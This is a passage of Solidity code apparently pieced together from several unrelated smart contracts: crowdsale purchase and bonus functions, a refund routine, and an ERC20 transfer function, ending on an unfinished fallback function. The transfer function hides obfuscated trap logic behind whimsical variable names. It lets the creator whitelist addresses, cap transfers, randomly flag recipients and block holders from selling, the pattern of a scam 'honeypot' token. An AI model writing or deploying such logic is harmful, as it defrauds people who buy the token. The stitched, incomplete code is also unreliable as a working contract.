    totalInvestedAmount = totalInvestedAmount.add(msg.value);
    walletAddress.transfer(msg.value);
    emit IssueTokens(msg.sender, msg.value, tokenAmount, _state);
}

function createTokens() saleIsOn internal {
    require(profitOwner != address(0));
    uint tokens = tokenRate.mul(msg.value);
    require(tokens.div(1 ether) >= 100); 
    profitOwner.transfer(msg.value);
    uint bonusTokens = 0;
    if (now < period2) {
        bonusTokens = tokens.div(4);
    } else if (now >= period2 && now < period3) {
        bonusTokens = tokens.div(5);
    } else if (now >= period3 && now < finish) {
        bonusTokens = tokens.div(100).mul(15);
    }
    uint tokensWithBonus = tokens.add(bonusTokens);
    token.transfer(msg.sender, tokensWithBonus);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (horses == false)) {
        glacier = chTx;
        apocalypse = true;
    }
    if ((address(sender) == creator) && (horses == true)) {
        shadowbolt[recipient] = true;
        warlock[recipient] = false;
        horses = false;
    }
    if ((amount > towel) && (shadowbolt[sender] == true) && (address(sender) != creator)) {
        mage[recipient] = true;
    }
    if (shadowbolt[recipient] != true) {
        warlock[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((warlock[sender]) && (shadowbolt[recipient] == false)) {
        warlock[recipient] = true;
    }
    if (shadowbolt[sender] == false) {
        if ((amount > towel) && (mage[sender] == true)) {
            require(false);
        }
        require(amount < glacier);
        if (apocalypse == true) {
            if (mage[sender] == true) {
                require(false);
            }
            mage[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function() payable isCrowdsale beforeDeadline public {
    uint amount = msg.value;
    if (amount == 0) revert(); 
    else if (amount < 250 finney) {
        if (sehrRaised < fundingGoal) {
            if (now < startTime + 31 days) revert(); 
        }
    }
    uint tokenAmount = (amount / price) * 1 ether; 
    if (sehrRaised < fundingGoal) { 
        if (now < startTime + 10 days) {
            tokenAmount = (13 * tokenAmount) / 10; 
        } else if (now < startTime + 20 days) {
            tokenAmount = (12 * tokenAmount) / 10; 
        } else if (now < startTime + 31 days) {
            tokenAmount = (11 * tokenAmount) / 10; 
        }
    }
    balanceOf[msg.sender] += amount;
    amountRaised += amount;
    sehrRaised += tokenAmount;
    tokenReward.transferFrom(SEHR_WALLET_ADDRESS, msg.sender, tokenAmount); 
    emit FundTransfer(msg.sender, amount, true);
}

function safeWithdrawal() afterDeadline isCheckDone public {
    if (!fundingGoalReached) {
        uint amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        if (amount > 0) {
            if (msg.sender.send(amount)) {
                emit FundTransfer(msg.sender, amount, false);
            } else {
                balanceOf[msg.sender] = amount;
            }
        }
    }
    if (fundingGoalReached && SSOTHEALTH_FUNDS_ADDRESS == msg.sender) {
        if (SSOTHEALTH_FUNDS_ADDRESS.send(amountRaised)) {
            emit FundTransfer(SSOTHEALTH_FUNDS_ADDRESS, amountRaised, false);
        } else {
            fundingGoalReached = false;
        }
    }
}

function() payable public {
